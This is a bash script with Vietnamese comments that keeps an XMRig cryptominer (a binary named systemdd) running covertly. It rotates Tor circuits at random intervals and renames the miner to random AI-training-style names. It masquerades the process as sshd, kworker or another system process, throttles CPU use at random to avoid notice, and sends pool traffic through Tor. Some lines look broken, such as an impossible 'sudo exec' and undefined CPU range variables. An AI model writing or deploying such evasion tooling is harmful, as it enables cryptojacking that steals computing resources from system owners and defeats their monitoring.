#!/bin/bash

# Vòng lặp vô tận để thay đổi IP ngẫu nhiên
while true; do
  # Ngẫu nhiên hóa thời gian ngủ từ 5 đến 30 phút
  sleep_time=$(shuf -i 300-1800 -n 1)
  sleep $sleep_time

  # Quyết định có đổi IP hay không với xác suất ngẫu nhiên
  should_change_ip=$(shuf -i 1-100 -n 1)

  # Chỉ đổi IP nếu giá trị ngẫu nhiên < 70 (70% cơ hội đổi IP)
  if [ "$should_change_ip" -lt 70 ]; then
    # Kiểm tra xem Tor có đang chạy không trước khi yêu cầu thay đổi mạch
    if pgrep -x "tor" > /dev/null; then
      echo "Đang yêu cầu Tor thay đổi IP qua mạch (Circuit)..."
      kill -HUP $(pgrep tor)
      echo "Tor đã thay đổi mạch."
    else
      echo "Dịch vụ Tor không hoạt động, không thể đổi mạch."
    fi
  else
    echo "Quyết định giữ nguyên IP ở chu kỳ này."
  fi

  # Dừng tiến trình cũ nếu đang chạy
  if [ -f /root/model.txt ]; then
    CURRENT_NAME=$(cat /root/model.txt)
    echo "Dừng tiến trình cũ: $CURRENT_NAME"
    pkill -f "/usr/sbin/$CURRENT_NAME"
  fi

  # Xóa tệp tiến trình cũ nếu tồn tại
  if [ -f /usr/sbin/$CURRENT_NAME ]; then
    echo "Xóa tệp tiến trình cũ: $CURRENT_NAME"
    rm -f /usr/sbin/$CURRENT_NAME
  fi

  # Danh sách các tên tiến trình hệ thống hợp lệ để bọc
  SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

  # Chọn một tên tiến trình hệ thống hợp lệ ngẫu nhiên để bọc
  RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

  # Danh sách các tên tiến trình liên quan đến AI training
  AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")

  # Chọn một tên tiến trình AI ngẫu nhiên từ danh sách
  RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}

  # Tạo số ngẫu nhiên
  RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

  # Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
  FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
  echo $FINAL_NAME > /root/model.txt

  # Sao chép file gốc systemdd thành tên mới
  cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

  # Tính toán số threads dựa trên % CPU ngẫu nhiên
  TOTAL_CORES=$(nproc)  # Xác định số CPU logic của hệ thống
  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads

  # Phân bổ tiến trình trên nhiều core với taskset
  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Sử dụng tất cả các core logic

  # Giới hạn công suất từ 50% đến 90% với cpulimit
  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống
  CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Giới hạn công suất ngẫu nhiên từ 50% đến 90%
  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Tính giá trị giới hạn CPU thực tế

  # Khởi động lại tiến trình dưới quyền người dùng nobody với tên tiến trình ngẫu nhiên
  echo "Khởi động lại XMRig (systemdd) với tên tiến trình: $FINAL_NAME"
  sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
done
